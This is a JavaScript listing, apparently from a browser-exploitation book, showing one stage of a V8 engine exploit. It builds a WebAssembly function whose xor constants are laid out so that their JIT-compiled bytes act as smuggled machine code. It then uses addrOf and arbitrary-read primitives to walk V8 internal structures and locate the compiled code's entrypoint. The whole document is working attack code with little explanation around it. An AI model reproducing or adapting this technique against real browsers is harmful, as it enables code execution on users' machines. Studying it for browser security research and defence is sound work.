// Emit a one-function WASM module whose body is a long chain of
// i64.xor(local.get 0, i64.const K_i) for K_i lifted from build_carrier.py.
// The Liftoff/TurboFan output on x86-64 is a run of
//     48 B8 <8-byte immediate>              ; movabs r?, K_i
//     48 31 <modrm>                         ; xor    r?, r?
// so the executable bytes we care about begin at (code_start + 2), and
// each 8-byte K_i is followed by 3 bookkeeping bytes we plan around.
export function buildCarrier(constants /* BigInt[] */) {
  const w = new WasmBuilder();                        // ❶
  w.addType([WasmType.I64], [WasmType.I64]);          // (i64) -> i64
  w.addFunction("payload", 0);
  w.emitLocalGet(0);
  for (const k of constants) {                        // ❷
    w.emitI64Const(k);
    w.emitI64Xor();
  }
  w.emitEnd();
  w.addExport("payload", ExportKind.Function, 0);
  return w.toBytes();
}

// Instantiate, then find the entrypoint of the compiled function.
export function instantiateAndLocate(bytes, mem /* our R/W view */) {
  const mod = new WebAssembly.Module(bytes);          // ❸ compiles now
  const inst = new WebAssembly.Instance(mod);
  const fn   = inst.exports.payload;

  // Walk: JSFunction -> shared -> WasmExportedFunctionData
  //        -> internal (WasmInternalFunction) -> call_target (CPT handle)
  const jsFuncAddr = addrOf(fn);                      // ❹ from Ch. 21
  const sfi        = mem.readTagged(jsFuncAddr + JS_FUNCTION_SHARED_OFFSET);
  const wefd       = mem.readTagged(sfi + SFI_FUNCTION_DATA_OFFSET);
  const internal   = mem.readTagged(wefd + WEFD_INTERNAL_OFFSET);
  const cptHandle  = mem.readU32   (internal + WIF_CALL_TARGET_OFFSET);
  const entrypoint = mem.readCptEntry(cptHandle);     // ❺ trusted-space read
  return { fn, entrypoint };
}
